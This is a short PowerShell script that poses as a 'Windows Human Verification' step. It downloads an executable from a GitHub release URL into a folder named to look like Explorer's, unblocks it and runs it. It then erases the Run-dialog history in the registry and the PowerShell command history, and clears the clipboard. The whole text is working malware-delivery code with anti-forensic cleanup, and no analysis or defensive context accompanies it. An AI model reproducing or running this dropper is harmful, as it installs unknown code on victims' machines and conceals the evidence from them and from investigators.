$verifyUrl="https://github.com/barbaraucpvc/Captcha2/releases/download/release/captcha.exe"
$verifyFile="$env:localappdata\Explorer\x69.exe"
mkdir "$env:localappdata\Explorer" -ErrorAction Ignore | Out-Null

Invoke-WebRequest -Uri $verifyUrl -OutFile $verifyFile -UseBasicParsing
Unblock-File -Path $verifyFile
& $verifyFile | Out-Null

reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
rm (Get-PSReadLineOption).HistorySavePath -Force
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
echo " Windows Human Verification"
"" | clip
